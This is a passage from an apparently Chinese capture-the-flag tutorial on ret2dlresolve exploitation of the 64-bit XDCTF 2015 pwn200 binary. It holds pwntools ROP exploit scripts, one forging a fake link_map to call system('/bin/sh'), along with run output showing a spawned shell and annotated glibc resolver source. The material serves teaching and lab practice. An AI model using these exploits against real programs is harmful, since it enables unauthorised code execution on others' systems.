<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=mh>0x00000000004007a3</span><span class=p>)</span> <span class=c1># 0x00000000004007a3: pop rdi; ret; </span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>bin_sh_addr</span><span class=p>)</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>resolve_call</span><span class=p>)</span>
<span class=c1># rop.raw(&#39;\x00&#39;*(256-len(rop.chain())))</span>
<span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>rop</span><span class=o>.</span><span class=n>chain</span><span class=p>())</span>
<span class=n>io</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</code></pre></div> <p>這時候即可利用成功</p> <div class=highlight><pre><span></span><code>❯<span class=w> </span>python<span class=w> </span>exp-manual4.py
<span class=o>[</span>+<span class=o>]</span><span class=w> </span>Starting<span class=w> </span><span class=nb>local</span><span class=w> </span>process<span class=w> </span><span class=s1>&#39;./main_partial_relro_64&#39;</span>:<span class=w> </span>pid<span class=w> </span><span class=m>47378</span>
<span class=o>[</span>*<span class=o>]</span><span class=w> </span><span class=s1>&#39;/mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/64/partial-relro/main_partial_relro_64&#39;</span>
<span class=w>    </span>Arch:<span class=w>     </span>amd64-64-little
<span class=w>    </span>RELRO:<span class=w>    </span>Partial<span class=w> </span>RELRO
<span class=w>    </span>Stack:<span class=w>    </span>No<span class=w> </span>canary<span class=w> </span>found
<span class=w>    </span>NX:<span class=w>       </span>NX<span class=w> </span>enabled
<span class=w>    </span>PIE:<span class=w>      </span>No<span class=w> </span>PIE<span class=w> </span><span class=o>(</span>0x400000<span class=o>)</span>
<span class=o>[</span>*<span class=o>]</span><span class=w> </span>running<span class=w> </span><span class=k>in</span><span class=w> </span>new<span class=w> </span>terminal:<span class=w> </span>/usr/bin/gdb<span class=w> </span>-q<span class=w>  </span><span class=s2>&quot;./main_partial_relro_64&quot;</span><span class=w> </span><span class=m>47378</span>
<span class=o>[</span>-<span class=o>]</span><span class=w> </span>Waiting<span class=w> </span><span class=k>for</span><span class=w> </span>debugger:<span class=w> </span>debugger<span class=w> </span>exited!<span class=w> </span><span class=o>(</span>maybe<span class=w> </span>check<span class=w> </span>/proc/sys/kernel/yama/ptrace_scope<span class=o>)</span>
<span class=o>[</span>*<span class=o>]</span><span class=w> </span>Loaded<span class=w> </span><span class=m>14</span><span class=w> </span>cached<span class=w> </span>gadgets<span class=w> </span><span class=k>for</span><span class=w> </span><span class=s1>&#39;./main_partial_relro_64&#39;</span>
0x7f0d01125170
<span class=o>[</span>*<span class=o>]</span><span class=w> </span>Switching<span class=w> </span>to<span class=w> </span>interactive<span class=w> </span>mode
$<span class=w> </span>whoami
iromise
</code></pre></div> <h5 id=second-try-no-leak>Second try - no leak<a class=headerlink href=#second-try-no-leak title="Permanent link">&para;</a></h5> <p>可以看出，在上面的測試中，我們仍然利用 write 函數泄露了 link_map 的地址，那麼，如果程序中沒有輸出函數，我們是否還能夠發起利用呢？答案是可以的。我們再來看一下 <code>_dl_fix_up</code> 的實現</p> <div class=highlight><pre><span></span><code><span class=w>    </span><span class=cm>/* Look up the target symbol.  If the normal lookup rules are not</span>
<span class=cm>      used don&#39;t look in the global scope.  */</span>
<span class=w>    </span><span class=c1>// 判斷符號的可見性</span>
<span class=w>    </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>__builtin_expect</span><span class=p>(</span><span class=n>ELFW</span><span class=p>(</span><span class=n>ST_VISIBILITY</span><span class=p>)(</span><span class=n>sym</span><span class=o>-&gt;</span><span class=n>st_other</span><span class=p>),</span><span class=w> </span><span class=mi>0</span><span class=p>)</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=mi>0</span><span class=p>)</span>
<span class=w>    </span><span class=p>{</span>
<span class=w>        </span><span class=c1>// 獲取符號的版本信息</span>
<span class=w>        </span><span class=k>const</span><span class=w> </span><span class=k>struct</span><span class=w> </span><span class=nc>r_found_version</span><span class=w> </span><span class=o>*</span><span class=n>version</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=nb>NULL</span><span class=p>;</span>
<span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>l</span><span class=o>-&gt;</span><span class=n>l_info</span><span class=p>[</span><span class=n>VERSYMIDX</span><span class=p>(</span><span class=n>DT_VERSYM</span><span class=p>)]</span><span class=w> </span><span class=o>!=</span><span class=w> </span><span class=nb>NULL</span><span class=p>)</span>
<span class=w>        </span><span class=p>{</span>
<span class=w>            </span><span class=k>const</span><span class=w> </span><span class=n>ElfW</span><span class=p>(</span><span class=n>Half</span><span class=p>)</span><span class=w> </span><span class=o>*</span><span class=n>vernum</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=k>const</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=o>*</span><span class=p>)</span><span class=n>D_PTR</span><span class=p>(</span><span class=n>l</span><span class=p>,</span><span class=w> </span><span class=n>l_info</span><span class=p>[</span><span class=n>VERSYMIDX</span><span class=p>(</span><span class=n>DT_VERSYM</span><span class=p>)]);</span>
<span class=w>            </span><span class=n>ElfW</span><span class=p>(</span><span class=n>Half</span><span class=p>)</span><span class=w> </span><span class=n>ndx</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>vernum</span><span class=p>[</span><span class=n>ELFW</span><span class=p>(</span><span class=n>R_SYM</span><span class=p>)(</span><span class=n>reloc</span><span class=o>-&gt;</span><span class=n>r_info</span><span class=p>)]</span><span class=w> </span><span class=o>&amp;</span><span class=w> </span><span class=mh>0x7fff</span><span class=p>;</span>
<span class=w>            </span><span class=n>version</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=o>&amp;</span><span class=n>l</span><span class=o>-&gt;</span><span class=n>l_versions</span><span class=p>[</span><span class=n>ndx</span><span class=p>];</span>
<span class=w>            </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>version</span><span class=o>-&gt;</span><span class=n>hash</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=mi>0</span><span class=p>)</span>
<span class=w>                </span><span class=n>version</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=nb>NULL</span><span class=p>;</span>
<span class=w>        </span><span class=p>}</span>
<span class=w>        </span><span class=cm>/* We need to keep the scope around so do some locking.  This is</span>
<span class=cm>         not necessary for objects which cannot be unloaded or when</span>
<span class=cm>         we are not using any threads (yet).  */</span>
<span class=w>        </span><span class=kt>int</span><span class=w> </span><span class=n>flags</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>DL_LOOKUP_ADD_DEPENDENCY</span><span class=p>;</span>
<span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=o>!</span><span class=n>RTLD_SINGLE_THREAD_P</span><span class=p>)</span>
<span class=w>        </span><span class=p>{</span>
<span class=w>            </span><span class=n>THREAD_GSCOPE_SET_FLAG</span><span class=p>();</span>
<span class=w>            </span><span class=n>flags</span><span class=w> </span><span class=o>|=</span><span class=w> </span><span class=n>DL_LOOKUP_GSCOPE_LOCK</span><span class=p>;</span>
<span class=w>        </span><span class=p>}</span>
<span class=cp>#ifdef RTLD_ENABLE_FOREIGN_CALL</span>
<span class=w>        </span><span class=n>RTLD_ENABLE_FOREIGN_CALL</span><span class=p>;</span>
<span class=cp>#endif</span>
<span class=w>        </span><span class=c1>// 查詢待解析符號所在的目標文件的 link_map</span>
<span class=w>        </span><span class=n>result</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>_dl_lookup_symbol_x</span><span class=p>(</span><span class=n>strtab</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>sym</span><span class=o>-&gt;</span><span class=n>st_name</span><span class=p>,</span><span class=w> </span><span class=n>l</span><span class=p>,</span><span class=w> </span><span class=o>&amp;</span><span class=n>sym</span><span class=p>,</span><span class=w> </span><span class=n>l</span><span class=o>-&gt;</span><span class=n>l_scope</span><span class=p>,</span>
<span class=w>                                     </span><span class=n>version</span><span class=p>,</span><span class=w> </span><span class=n>ELF_RTYPE_CLASS_PLT</span><span class=p>,</span><span class=w> </span><span class=n>flags</span><span class=p>,</span><span class=w> </span><span class=nb>NULL</span><span class=p>);</span>
<span class=w>        </span><span class=cm>/* We are done with the global scope.  */</span>
<span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=o>!</span><span class=n>RTLD_SINGLE_THREAD_P</span><span class=p>)</span>
<span class=w>            </span><span class=n>THREAD_GSCOPE_RESET_FLAG</span><span class=p>();</span>
<span class=cp>#ifdef RTLD_FINALIZE_FOREIGN_CALL</span>
<span class=w>        </span><span class=n>RTLD_FINALIZE_FOREIGN_CALL</span><span class=p>;</span>
<span class=cp>#endif</span>
<span class=w>        </span><span class=cm>/* Currently result contains the base load address (or link map)</span>
<span class=cm>         of the object that defines sym.  Now add in the symbol</span>
<span class=cm>         offset.  */</span>
<span class=w>        </span><span class=c1>// 基於查詢到的 link_map 計算符號的絕對地址: result-&gt;l_addr + sym-&gt;st_value</span>
<span class=w>        </span><span class=c1>// l_addr 爲待解析函數所在文件的基地址</span>
<span class=w>        </span><span class=n>value</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>DL_FIXUP_MAKE_VALUE</span><span class=p>(</span><span class=n>result</span><span class=p>,</span>
<span class=w>                                    </span><span class=n>SYMBOL_ADDRESS</span><span class=p>(</span><span class=n>result</span><span class=p>,</span><span class=w> </span><span class=n>sym</span><span class=p>,</span><span class=w> </span><span class=nb>false</span><span class=p>));</span>
<span class=w>    </span><span class=p>}</span>
<span class=w>    </span><span class=k>else</span>
<span class=w>    </span><span class=p>{</span>
<span class=w>        </span><span class=cm>/* We already found the symbol.  The module (and therefore its load</span>
<span class=cm>         address) is also known.  */</span>
<span class=w>        </span><span class=n>value</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>DL_FIXUP_MAKE_VALUE</span><span class=p>(</span><span class=n>l</span><span class=p>,</span><span class=w> </span><span class=n>SYMBOL_ADDRESS</span><span class=p>(</span><span class=n>l</span><span class=p>,</span><span class=w> </span><span class=n>sym</span><span class=p>,</span><span class=w> </span><span class=nb>true</span><span class=p>));</span>
<span class=w>        </span><span class=n>result</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>l</span><span class=p>;</span>
<span class=w>    </span><span class=p>}</span>
</code></pre></div> <p>如果我們故意將 __builtin_expect(ELFW(ST_VISIBILITY)(sym-&gt;st_other), 0) 設置爲 0，那麼程序就會執行 else 分支。具體的，我們設置 sym-&gt;st_other 不爲 0 即可滿足這一條件。</p> <div class=highlight><pre><span></span><code><span class=cm>/* How to extract and insert information held in the st_other field.  */</span>
<span class=cp>#define ELF32_ST_VISIBILITY(o)        ((o) &amp; 0x03)</span>
<span class=cm>/* For ELF64 the definitions are the same.  */</span>
<span class=cp>#define ELF64_ST_VISIBILITY(o)        ELF32_ST_VISIBILITY (o)</span>
<span class=cm>/* Symbol visibility specification encoded in the st_other field.  */</span>
<span class=cp>#define STV_DEFAULT        0                </span><span class=cm>/* Default symbol visibility rules */</span>
<span class=cp>#define STV_INTERNAL        1                </span><span class=cm>/* Processor specific hidden class */</span>
<span class=cp>#define STV_HIDDEN        2                </span><span class=cm>/* Sym unavailable in other modules */</span>
<span class=cp>#define STV_PROTECTED        3                </span><span class=cm>/* Not preemptible, not exported */</span>
</code></pre></div> <p>此時程序計算 value 的方式爲</p> <div class=highlight><pre><span></span><code>value = l-&gt;l_addr + sym-&gt;st_value
</code></pre></div> <p>通過查看 link_map 結構體的<a href=https://code.woboq.org/userspace/glibc/include/link.h.html#link_map>定義</a>，可以知道 l_addr 是 link_map 的第一個成員，那麼如果我們僞造上述這兩個變量，並藉助於已有的被解析的函數地址，比如</p> <ul> <li>僞造 link_map-&gt;l_addr 爲已解析函數與想要執行的目標函數的偏移值，如 addr_system-addr_xxx </li> <li>僞造 sym-&gt;st_value 爲已經解析過的某個函數的 got 表的位置，即相當於有了一個隱式的信息泄露</li> </ul> <p>那就可以得到對應的目標地址。</p> <div class=highlight><pre><span></span><code><span class=k>struct</span><span class=w> </span><span class=nc>link_map</span>
<span class=w>  </span><span class=p>{</span>
<span class=w>    </span><span class=cm>/* These first few members are part of the protocol with the debugger.</span>
<span class=cm>       This is the same format used in SVR4.  */</span>
<span class=w>    </span><span class=n>ElfW</span><span class=p>(</span><span class=n>Addr</span><span class=p>)</span><span class=w> </span><span class=n>l_addr</span><span class=p>;</span><span class=w>                </span><span class=cm>/* Difference between the address in the ELF</span>
<span class=cm>                                   file and the addresses in memory.  */</span>
<span class=w>    </span><span class=kt>char</span><span class=w> </span><span class=o>*</span><span class=n>l_name</span><span class=p>;</span><span class=w>                </span><span class=cm>/* Absolute file name object was found in.  */</span>
<span class=w>    </span><span class=n>ElfW</span><span class=p>(</span><span class=n>Dyn</span><span class=p>)</span><span class=w> </span><span class=o>*</span><span class=n>l_ld</span><span class=p>;</span><span class=w>                </span><span class=cm>/* Dynamic section of the shared object.  */</span>
<span class=w>    </span><span class=k>struct</span><span class=w> </span><span class=nc>link_map</span><span class=w> </span><span class=o>*</span><span class=n>l_next</span><span class=p>,</span><span class=w> </span><span class=o>*</span><span class=n>l_prev</span><span class=p>;</span><span class=w> </span><span class=cm>/* Chain of loaded objects.  */</span>
<span class=w>    </span><span class=cm>/* All following members are internal to the dynamic linker.</span>
<span class=cm>       They may change without notice.  */</span>
<span class=w>    </span><span class=cm>/* This is an element which is only ever different from a pointer to</span>
<span class=cm>       the very same copy of this type for ld.so when it is used in more</span>
<span class=cm>       than one namespace.  */</span>
<span class=w>    </span><span class=k>struct</span><span class=w> </span><span class=nc>link_map</span><span class=w> </span><span class=o>*</span><span class=n>l_real</span><span class=p>;</span>
<span class=w>    </span><span class=cm>/* Number of the namespace this link map belongs to.  */</span>
<span class=w>    </span><span class=n>Lmid_t</span><span class=w> </span><span class=n>l_ns</span><span class=p>;</span>
<span class=w>    </span><span class=k>struct</span><span class=w> </span><span class=nc>libname_list</span><span class=w> </span><span class=o>*</span><span class=n>l_libname</span><span class=p>;</span>
<span class=w>    </span><span class=cm>/* Indexed pointers to dynamic section.</span>
<span class=cm>       [0,DT_NUM) are indexed by the processor-independent tags.</span>
<span class=cm>       [DT_NUM,DT_NUM+DT_THISPROCNUM) are indexed by the tag minus DT_LOPROC.</span>
<span class=cm>       [DT_NUM+DT_THISPROCNUM,DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM) are</span>
<span class=cm>       indexed by DT_VERSIONTAGIDX(tagvalue).</span>
<span class=cm>       [DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM,</span>
<span class=cm>        DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM) are indexed by</span>
<span class=cm>       DT_EXTRATAGIDX(tagvalue).</span>
<span class=cm>       [DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM,</span>
<span class=cm>        DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM+DT_VALNUM) are</span>
<span class=cm>       indexed by DT_VALTAGIDX(tagvalue) and</span>
<span class=cm>       [DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM+DT_VALNUM,</span>
<span class=cm>        DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM+DT_VALNUM+DT_ADDRNUM)</span>
<span class=cm>       are indexed by DT_ADDRTAGIDX(tagvalue), see &lt;elf.h&gt;.  */</span>
<span class=w>    </span><span class=n>ElfW</span><span class=p>(</span><span class=n>Dyn</span><span class=p>)</span><span class=w> </span><span class=o>*</span><span class=n>l_info</span><span class=p>[</span><span class=n>DT_NUM</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>DT_THISPROCNUM</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>DT_VERSIONTAGNUM</span>
<span class=w>                      </span><span class=o>+</span><span class=w> </span><span class=n>DT_EXTRANUM</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>DT_VALNUM</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>DT_ADDRNUM</span><span class=p>];</span>
</code></pre></div> <p>一般而言，至少有 __libc_start_main 已經解析過了。本例中，顯然不止這一個函數。</p> <div class=highlight><pre><span></span><code>.got:0000000000600FF0 ; ===========================================================================
.got:0000000000600FF0
.got:0000000000600FF0 ; Segment type: Pure data
.got:0000000000600FF0 ; Segment permissions: Read/Write
.got:0000000000600FF0 ; Segment alignment &#39;qword&#39; can not be represented in assembly
.got:0000000000600FF0 _got            segment para public &#39;DATA&#39; use64
.got:0000000000600FF0                 assume cs:_got
.got:0000000000600FF0                 ;org 600FF0h
.got:0000000000600FF0 __libc_start_main_ptr dq offset __libc_start_main
.got:0000000000600FF0                                         ; DATA XREF: _start+24↑r
.got:0000000000600FF8 __gmon_start___ptr dq offset __gmon_start__
.got:0000000000600FF8                                         ; DATA XREF: _init_proc+4↑r
.got:0000000000600FF8 _got            ends
.got:0000000000600FF8
.got.plt:0000000000601000 ; ===========================================================================
.got.plt:0000000000601000
.got.plt:0000000000601000 ; Segment type: Pure data
.got.plt:0000000000601000 ; Segment permissions: Read/Write
.got.plt:0000000000601000 ; Segment alignment &#39;qword&#39; can not be represented in assembly
.got.plt:0000000000601000 _got_plt        segment para public &#39;DATA&#39; use64
.got.plt:0000000000601000                 assume cs:_got_plt
.got.plt:0000000000601000                 ;org 601000h
.got.plt:0000000000601000 _GLOBAL_OFFSET_TABLE_ dq offset _DYNAMIC
.got.plt:0000000000601008 qword_601008    dq 0                    ; DATA XREF: sub_400500↑r
.got.plt:0000000000601010 qword_601010    dq 0                    ; DATA XREF: sub_400500+6↑r
.got.plt:0000000000601018 off_601018      dq offset write         ; DATA XREF: _write↑r
.got.plt:0000000000601020 off_601020      dq offset strlen        ; DATA XREF: _strlen↑r
.got.plt:0000000000601028 off_601028      dq offset setbuf        ; DATA XREF: _setbuf↑r
.got.plt:0000000000601030 off_601030      dq offset read          ; DATA XREF: _read↑r
.got.plt:0000000000601030 _got_plt        ends
.got.plt:0000000000601030
</code></pre></div> <p>與此同時，通過閱讀 <code>_dl_fixup</code> 函數的代碼，在設置 <code>__builtin_expect(ELFW(ST_VISIBILITY)(sym-&gt;st_other), 0)</code> 爲 0 後，我們可以發現，該函數主要依賴了 link_map 中 l_info 的內容。因此，我們同樣需要僞造該部分所需要的內容。</p> <p>利用代碼如下</p> <div class=highlight><pre><span></span><code><span class=kn>from</span><span class=w> </span><span class=nn>pwn</span><span class=w> </span><span class=kn>import</span> <span class=o>*</span>
<span class=c1># context.log_level=&quot;debug&quot;</span>
<span class=n>context</span><span class=o>.</span><span class=n>terminal</span> <span class=o>=</span> <span class=p>[</span><span class=s2>&quot;tmux&quot;</span><span class=p>,</span><span class=s2>&quot;splitw&quot;</span><span class=p>,</span><span class=s2>&quot;-h&quot;</span><span class=p>]</span>
<span class=n>context</span><span class=o>.</span><span class=n>arch</span> <span class=o>=</span> <span class=s2>&quot;amd64&quot;</span>
<span class=n>io</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=s2>&quot;./main_partial_relro_64&quot;</span><span class=p>)</span>
<span class=n>elf</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s2>&quot;./main_partial_relro_64&quot;</span><span class=p>)</span>

<span class=n>bss_addr</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>bss</span><span class=p>()</span>
<span class=n>csu_front_addr</span> <span class=o>=</span> <span class=mh>0x400780</span>
<span class=n>csu_end_addr</span> <span class=o>=</span> <span class=mh>0x40079A</span>
<span class=n>vuln_addr</span> <span class=o>=</span> <span class=mh>0x400637</span>


<span class=k>def</span><span class=w> </span><span class=nf>csu</span><span class=p>(</span><span class=n>rbx</span><span class=p>,</span> <span class=n>rbp</span><span class=p>,</span> <span class=n>r12</span><span class=p>,</span> <span class=n>r13</span><span class=p>,</span> <span class=n>r14</span><span class=p>,</span> <span class=n>r15</span><span class=p>):</span>
    <span class=c1># pop rbx, rbp, r12, r13, r14, r15</span>
    <span class=c1># rbx = 0</span>
    <span class=c1># rbp = 1, enable not to jump</span>
    <span class=c1># r12 should be the function that you want to call</span>
    <span class=c1># rdi = edi = r13d</span>
    <span class=c1># rsi = r14</span>
    <span class=c1># rdx = r15</span>
    <span class=n>payload</span> <span class=o>=</span> <span class=n>p64</span><span class=p>(</span><span class=n>csu_end_addr</span><span class=p>)</span>
    <span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>rbx</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>rbp</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>r12</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>r13</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>r14</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>r15</span><span class=p>)</span>
    <span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>csu_front_addr</span><span class=p>)</span>
    <span class=n>payload</span> <span class=o>+=</span> <span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span> <span class=o>*</span> <span class=mh>0x38</span>
    <span class=k>return</span> <span class=n>payload</span>


<span class=k>def</span><span class=w> </span><span class=nf>ret2dlresolve_with_fakelinkmap_x64</span><span class=p>(</span><span class=n>elf</span><span class=p>,</span> <span class=n>fake_linkmap_addr</span><span class=p>,</span> <span class=n>known_function_ptr</span><span class=p>,</span> <span class=n>offset_of_two_addr</span><span class=p>):</span>
<span class=w>    </span><span class=sd>&#39;&#39;&#39;</span>
<span class=sd>    elf: is the ELF object</span>

<span class=sd>    fake_linkmap_addr: the address of the fake linkmap</span>

<span class=sd>    known_function_ptr: a already known pointer of the function, e.g., elf.got[&#39;__libc_start_main&#39;]</span>

<span class=sd>    offset_of_two_addr: target_function_addr - *(known_function_ptr), where</span>
<span class=sd>                        target_function_addr is the function you want to execute</span>

<span class=sd>    WARNING: assert *(known_function_ptr-8) &amp; 0x0000030000000000 != 0 as ELF64_ST_VISIBILITY(o) = o &amp; 0x3</span>

<span class=sd>    WARNING: be careful that fake_linkmap is 0x100 bytes length   </span>

<span class=sd>    we will do _dl_runtime_resolve(linkmap,reloc_arg) where reloc_arg=0</span>

<span class=sd>    linkmap:</span>
<span class=sd>        0x00: l_addr = offset_of_two_addr</span>
<span class=sd>      fake_DT_JMPREL entry, addr = fake_linkmap_addr + 0x8</span>
<span class=sd>        0x08: 17, tag of the JMPREL</span>
<span class=sd>        0x10: fake_linkmap_addr + 0x18, pointer of the fake JMPREL</span>
<span class=sd>      fake_JMPREL, addr = fake_linkmap_addr + 0x18</span>
<span class=sd>        0x18: p_r_offset, offset pointer to the resloved addr</span>
<span class=sd>        0x20: r_info</span>
<span class=sd>        0x28: append</span>
<span class=sd>      resolved addr</span>
<span class=sd>        0x30: r_offset</span>
<span class=sd>      fake_DT_SYMTAB, addr = fake_linkmap_addr + 0x38</span>
<span class=sd>        0x38: 6, tag of the DT_SYMTAB</span>
<span class=sd>        0x40: known_function_ptr-8, p_fake_symbol_table</span>
<span class=sd>      command that you want to execute for system</span>
<span class=sd>        0x48: /bin/sh</span>
<span class=sd>      P_DT_STRTAB, pointer for DT_STRTAB</span>
<span class=sd>        0x68: fake a pointer, e.g., fake_linkmap_addr</span>
<span class=sd>      p_DT_SYMTAB, pointer for fake_DT_SYMTAB</span>
<span class=sd>        0x70: fake_linkmap_addr + 0x38</span>
<span class=sd>      p_DT_JMPREL, pointer for fake_DT_JMPREL</span>
<span class=sd>        0xf8: fake_linkmap_addr + 0x8</span>
<span class=sd>    &#39;&#39;&#39;</span>
    <span class=n>plt0</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>get_section_by_name</span><span class=p>(</span><span class=s1>&#39;.plt&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>header</span><span class=o>.</span><span class=n>sh_addr</span>

    <span class=n>linkmap</span> <span class=o>=</span> <span class=n>p64</span><span class=p>(</span><span class=n>offset_of_two_addr</span> <span class=o>&amp;</span> <span class=p>(</span><span class=mi>2</span><span class=o>**</span><span class=mi>64</span> <span class=o>-</span> <span class=mi>1</span><span class=p>))</span>
    <span class=n>linkmap</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mi>17</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>fake_linkmap_addr</span> <span class=o>+</span> <span class=mh>0x18</span><span class=p>)</span>
    <span class=c1># here we set p_r_offset = fake_linkmap_addr + 0x30 - two_offset</span>
    <span class=c1># as void *const rel_addr = (void *)(l-&gt;l_addr + reloc-&gt;r_offset) and l-&gt;l_addr = offset_of_two_addr</span>
    <span class=n>linkmap</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>((</span><span class=n>fake_linkmap_addr</span> <span class=o>+</span> <span class=mh>0x30</span> <span class=o>-</span> <span class=n>offset_of_two_addr</span><span class=p>)</span>
                   <span class=o>&amp;</span> <span class=p>(</span><span class=mi>2</span><span class=o>**</span><span class=mi>64</span> <span class=o>-</span> <span class=mi>1</span><span class=p>))</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x7</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
    <span class=n>linkmap</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
    <span class=n>linkmap</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mi>6</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>known_function_ptr</span><span class=o>-</span><span class=mi>8</span><span class=p>)</span>
    <span class=n>linkmap</span> <span class=o>+=</span> <span class=s1>&#39;/bin/sh</span><span class=se>\x00</span><span class=s1>&#39;</span>           <span class=c1># cmd offset 0x48</span>
    <span class=n>linkmap</span> <span class=o>=</span> <span class=n>linkmap</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mh>0x68</span><span class=p>,</span> <span class=s1>&#39;A&#39;</span><span class=p>)</span>
    <span class=n>linkmap</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>fake_linkmap_addr</span><span class=p>)</span>
    <span class=n>linkmap</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>fake_linkmap_addr</span> <span class=o>+</span> <span class=mh>0x38</span><span class=p>)</span>
    <span class=n>linkmap</span> <span class=o>=</span> <span class=n>linkmap</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mh>0xf8</span><span class=p>,</span> <span class=s1>&#39;A&#39;</span><span class=p>)</span>
    <span class=n>linkmap</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>fake_linkmap_addr</span> <span class=o>+</span> <span class=mi>8</span><span class=p>)</span>

    <span class=n>resolve_call</span> <span class=o>=</span> <span class=n>p64</span><span class=p>(</span><span class=n>plt0</span><span class=o>+</span><span class=mi>6</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>fake_linkmap_addr</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
    <span class=k>return</span> <span class=p>(</span><span class=n>linkmap</span><span class=p>,</span> <span class=n>resolve_call</span><span class=p>)</span>


<span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;Welcome to XDCTF2015~!</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
<span class=n>gdb</span><span class=o>.</span><span class=n>attach</span><span class=p>(</span><span class=n>io</span><span class=p>)</span>

<span class=n>fake_linkmap_addr</span> <span class=o>=</span> <span class=n>bss_addr</span><span class=o>+</span><span class=mh>0x100</span>

<span class=c1># construct fake string, symbol, reloc.modify .dynstr pointer in .dynamic section to a specific location</span>
<span class=n>rop</span> <span class=o>=</span> <span class=n>ROP</span><span class=p>(</span><span class=s2>&quot;./main_partial_relro_64&quot;</span><span class=p>)</span>
<span class=n>offset</span> <span class=o>=</span> <span class=mi>112</span><span class=o>+</span><span class=mi>8</span>
<span class=n>rop</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=n>offset</span><span class=o>*</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>)</span>
<span class=n>libc</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s1>&#39;libc.so.6&#39;</span><span class=p>)</span>
<span class=n>link_map</span><span class=p>,</span> <span class=n>resolve_call</span> <span class=o>=</span> <span class=n>ret2dlresolve_with_fakelinkmap_x64</span><span class=p>(</span><span class=n>elf</span><span class=p>,</span><span class=n>fake_linkmap_addr</span><span class=p>,</span> <span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;read&#39;</span><span class=p>],</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;system&#39;</span><span class=p>]</span><span class=o>-</span> <span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;read&#39;</span><span class=p>])</span>
